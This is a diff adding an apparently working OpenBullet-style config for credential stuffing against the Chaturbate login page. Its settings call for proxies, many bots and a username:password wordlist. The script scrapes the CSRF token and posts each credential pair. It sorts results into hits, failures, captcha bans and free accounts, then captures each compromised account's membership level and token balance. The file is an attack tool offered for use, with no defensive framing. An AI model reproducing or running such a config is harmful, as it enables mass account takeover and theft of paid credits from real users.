@@ -1,0 +1,83 @@
+[SETTINGS]
+{
+  "Name": "Chaturbate",
+  "SuggestedBots": 100,
+  "MaxCPM": 0,
+  "LastModified": "2020-01-29T21:24:56.3650519+01:00",
+  "AdditionalInfo": "Captures membership status and tokens. Free goes to FREE.",
+  "Author": "ND03",
+  "Version": "1.4.2HF [Anomaly]",
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 5,
+  "BanProxyAfterGoodStatus": false,
+  "EncodeData": false,
+  "AllowedWordlist1": "UserPass",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "CaptchaUrl": "",
+  "Base64": "",
+  "Grayscale": false,
+  "RemoveLines": false,
+  "RemoveNoise": false,
+  "Dilate": false,
+  "Threshold": 1.0,
+  "DiffKeep": 0.0,
+  "DiffHide": 0.0,
+  "Saturate": false,
+  "Saturation": 0.0,
+  "Transparent": false,
+  "Contour": false,
+  "OnlyShow": false,
+  "ContrastGamma": false,
+  "Contrast": 1.0,
+  "Gamma": 1.0,
+  "Brightness": 1.0,
+  "RemoveLinesMin": 0,
+  "RemoveLinesMax": 0,
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+#Get REQUEST GET "https://chaturbate.com/auth/login/?next=/" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8" 
+
+#Middle PARSE "<SOURCE>" LR "'csrfmiddlewaretoken' value='" "' " CreateEmpty=FALSE -> VAR "middle" 
+
+#Login REQUEST POST "https://chaturbate.com/auth/login/?next=/" 
+  CONTENT "csrfmiddlewaretoken=<middle>&username=<USER>&password=<PASS>&next=%2F" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8" 
+  HEADER "Referer: https://chaturbate.com/" 
+
+#Login KEYCHECK 
+  KEYCHAIN Success OR 
+    KEY "<th>Status:</th>" 
+  KEYCHAIN Failure OR 
+    KEY "Username may only contain letters(a-z) and numbers(0-9)." 
+    KEY "enter a correct username and password." 
+  KEYCHAIN Ban OR 
+    KEY "<li>Captcha is required</li>" 
+  KEYCHAIN Custom "FREE" AND 
+    KEY "<td>Basic Member</td>" 
+    KEY "<span class='tokencount' updatable-count>0</span> " 
+
+#Membership PARSE "<SOURCE>" REGEX "<td>(.*?)<\\/td>" "[1]" CreateEmpty=FALSE -> CAP "Membership" 
+
+#Tokens PARSE "<SOURCE>" REGEX "<span class='tokencount' updatable-count>(.*?)<\\/span>" "[1]" CreateEmpty=FALSE -> CAP "Tokens" 
+
